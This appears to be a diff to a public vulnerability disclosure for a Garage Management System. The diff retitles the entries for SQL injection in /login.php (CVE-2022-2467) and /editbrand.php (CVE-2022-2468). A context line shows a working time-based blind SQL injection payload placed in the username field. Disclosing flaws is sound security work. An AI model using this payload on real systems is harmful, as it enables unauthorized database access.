@@ -6,7 +6,7 @@
 ### Version: 1.0
 ### Tested on: windows10 + phpstudy
 
-# 1.CVE-2022-2467
+# 1./login.php(CVE-2022-2467)
 /login.php SQL injection exists at the login port
 
 ### Sample request POC #1
@@ -33,7 +33,7 @@ username=1@a.com' AND (SELECT 6427 FROM (SELECT(SLEEP(5)))LwLu) AND 'hsvT'='hsvT
 ![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/20220719153600.png "Garage Management System")
 
 
-# 2./editbrand.php
+# 2./editbrand.php(CVE-2022-2468)
 /editbrand.php SQL injection exists for parameter ID
 
 ### Sample request POC #2
